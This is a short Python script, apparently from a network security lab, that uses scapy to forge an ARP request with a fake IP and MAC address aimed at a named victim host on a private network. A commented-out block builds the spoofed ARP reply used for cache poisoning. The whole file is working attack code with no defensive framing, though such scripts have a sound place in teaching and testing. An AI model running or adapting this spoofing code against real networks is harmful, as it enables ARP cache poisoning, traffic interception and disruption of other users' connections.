#!/usr/bin/env python3

from scapy.all import *

victim_ip = "192.168.65.128"
victim_real_mac = "00:50:56:fa:26:b4"

fake_ip = "1.2.3.4"
fake_MAC = "55:55:55:55:55:55"

#send valid spoofed responce
#ether = Ether(src = fake_MAC, dst = victim_real_mac)
#arp = ARP(psrc = fake_ip, hwsrc = fake_MAC, pdst = victim_ip, hwdst = victim_real_mac)
#arp.op = 2

#send valid spoofed request
ether = Ether(src = fake_MAC, dst = "FF:FF:FF:FF:FF:FF")
arp = ARP(psrc = fake_ip, hwsrc = fake_MAC, pdst = victim_ip)
arp.op = 1
# arp op 2 is responce while 1 is request
frame = ether/arp
sendp(frame)
